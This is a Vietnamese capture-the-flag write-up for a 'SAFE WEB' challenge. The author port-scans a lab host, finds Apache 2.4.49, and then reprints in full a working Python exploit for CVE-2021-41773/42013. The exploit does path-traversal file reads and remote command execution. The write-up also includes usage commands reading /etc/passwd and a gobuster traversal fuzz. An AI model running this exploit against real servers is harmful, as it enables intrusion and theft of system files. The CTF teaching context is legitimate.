# SAFE WEB
![alt text](image-41.png)

Đầu tiên khi mới vào và thấy rất nhiều chức năng và có cả endpoint /admin nữa nhưng theo gợi ý đề bài và tên bài ```trang web này không có lỗ hỏng```
Ban đầu mình cũng không tin và test nát cái trang này nhưng đúng là nó không có lỗ hỏng thật vậy chúng ta phải làm như nào.

### Solution
- thật ra 1 host có thể có nhiều port khác nhau, nếu như trang web với host và port như hiện tại không có lỗ hỏng, biết đâu trên port khác của cái host này nó có lổ hỏng thì sao vậy chúng ta phải đi kiếm ```New attack surface```(bề mặt tấn công mới)

mình sẽ dùng nmap([text](https://nmap.org/)) để tra xem có port nào đang mở:

mình dùng: ```nmap -sV -O -T4 localhost -p 0-11000```
```
-sV: Thăm dò các cổng mở để xác định thông tin dịch vụ/phiên bản
-O: Bật phát hiện hệ điều hành
-T4: Đặt mẫu thời gian (cao hơn là nhanh hơn)
localhost: host trang web mà bạn muốn test
-p 0-11000: quét từ cổng 0 tới 11000
```
sau khi quét nó ra:
![alt text](image-42.png)

chúng ta phát hiện 1 port mới là 10000 với version khá cũ là 2.4.49 hãy vào port này thử
![alt text](image-43.png)

có vẻ như trang web này bị lỗi và có 1 link troll nhưng để ý kĩ 1 tí nó trả về 200 mà chứ có lỗi như web nói đâu, vậy là nghi nghi ở đây

tiếp theo mình thử research port của trang web này là 10000 và xem có gì khai thác được không.

![alt text](image-44.png)

Ôi mình thấy cả CVE([CVE](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)) cho cái port này 
Vậy nó có thể dính CVE-2021-41773 & CVE-2021-42013

thử trang web trên chúng ta được 1 script python để khai thác như sau:
```
# !/usr/bin/python3
# Author: Ravin | Blacknote
# CVE-2021-41773 | CVE-2021-42013
# Apache HTTP Server 2.4.49-2.4.50 - Path Traversal & Remote Code Execution

# Usage: 
# python3 exploit.py 127.0.0.1 8080 rce 'id'
# python3 exploit.py 127.0.0.1 8080 file '/etc/passwd'

# Reference(s):
# https://www.picussecurity.com/resource/blog/simulate-apache-cve-2021-41773-exploits-vulnerability

import argparse
import requests as req


# Path Traversal
payload1="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# Path Traversal
payload2="/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
# RCE
payload3="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


url = ""

def check(url):
    res = req.get(url)
    server = res.headers.get('Server')

    if "Apache/2.4.49" or "Apache/2.4.50" in server:
        print("[i] Host appears to be vulnerable.")
        
    else:
        print("[i] Host might not be vulnerable.")
        force = input("[!] Do you still want to run the exploit? (y/n): ")
        if force.lower() == "n":
            exit(0)

            

def rce(url, cmd):

    payload_url=f"{url}{payload3}"
    data = f"echo Content-Type: text/plain; echo; {cmd}"
    s = req.Session()
    r = req.Request('POST', payload_url, data=data).prepare()
    r.url = payload_url
    resp = s.send(r)
    if resp.status_code == 200:
        print("[*] Working Payload: " + payload_url + "\n")
        print(f"$ {cmd}")
        print((resp.content).decode('utf-8', errors='ignore'))
        while 1:
            cmd = input("$ ")
            if cmd =='exit':
                    exit(0)
            else:
                data = f"echo Content-Type: text/plain; echo; {cmd}"
                s = req.Session()
                r = req.Request('POST', payload_url, data=data).prepare()
                r.url = payload_url
                resp = s.send(r)
                print((resp.content).decode('utf-8', errors='ignore'))
    else:
        print("[!] Host seems to be patched.")
        exit(0)         

def traversal(url, file):
  
    payloads = [payload1, payload2]
    
    for i in payloads:
        payload_url=f"{url}{i}{file}"
        s = req.Session()
        r = req.Request('GET', payload_url).prepare()
        r.url = payload_url
        resp = s.send(r)
        if resp.status_code == 200:
            print("[*] Working payload: " + f"{url}{i}" + "/path/to/file\n")
            print((resp.content).decode('utf-8', errors='ignore') + "\n")
            while 1:
                file = input("File (Absolute Path)> ")
                if file =='exit':
                    exit(0)
                else:
                    payload_url=f"{url}{i}{file}"
                    s = req.Session()
                    r = req.Request('GET', payload_url).prepare()
                    r.url = payload_url
                    resp = s.send(r)
                    print((resp.content).decode('utf-8', errors='ignore') + "\n")
        elif i==payload2 and resp.status_code != 200:
            print("[!] Host seems to be patched.")
            exit(0)

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-41773 & CVE-2021-42013")
    parser.add_argument("rhost")
    parser.add_argument("rport")
    parser.add_argument("opt")
    parser.add_argument("cmd")

    args = parser.parse_args()

    if "http://" or "https://" not in args.rhost:
        url = f"http://{args.rhost}:{args.rport}"
        
    else:
        url = f"{args.rhost}:{args.rport}"

    check(url)

    if "rce" in (args.opt).lower():
        rce(url, args.cmd)
    elif "file" in (args.opt).lower():
        traversal(url, args.cmd)
    else:
        print("[!] Invalid Option!")
        exit(0)

if __name__ == '__main__':
    main()
```

hướng dẫn sử dụng cũng có
đối với RCE:
```
python3 exploit.py 127.0.0.1 8080 rce 'id'
```
đối với LFI:
```
python3 exploit.py 127.0.0.1 8080 file '/etc/passwd'
```
ok thử RCE xem

![alt text](image-45.png)

ok tuy không RCE được nhưng với output trả về thì chắc chắc là nó dính CVE

tiếp đến hãy thử LFI
![alt text](image-46.png)

tuyệt vời ta đã lấy được phần đầu tiên sau khi decode base64:
```HUTECHCTF{Finally_you```

Vậy các phần còn lại ở đâu ??
sau khi mình mò rất nhiều file và không thể tìm được các phần còn lại của flag mình bắt buộc phải dùng tool để kiếm các file trả về status 200. => tối ưu hóa thời gian

mình sẽ dùng wordlist ở ```usr/share/wordlists/seclists/Fuzzing/LFI/```
file wordlist mình dùng là ```LFI-etc-files-of-all-linux-packages.txt```

tool mình dùng là gobuster([help](https://www.kali.org/tools/gobuster/)), mình sẽ quét xem file nào trả về content 200 thì lấy 
```
gobuster dir -u http://localhost:10000/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
```

![alt text](image-47.png)
có rất nhiều file trả về 200 và mình thử từng cái và part 2 là
![alt text](image-48.png)
Part 2: ```_can_find_flag_```

part cuối là:
![alt text](image-49.png)
Part 3: ```hahaahahahahaha!}```

Problem solved: ```HUTECHCTF{Finally_you_can_find_flag_hahaahahahahaha!}```


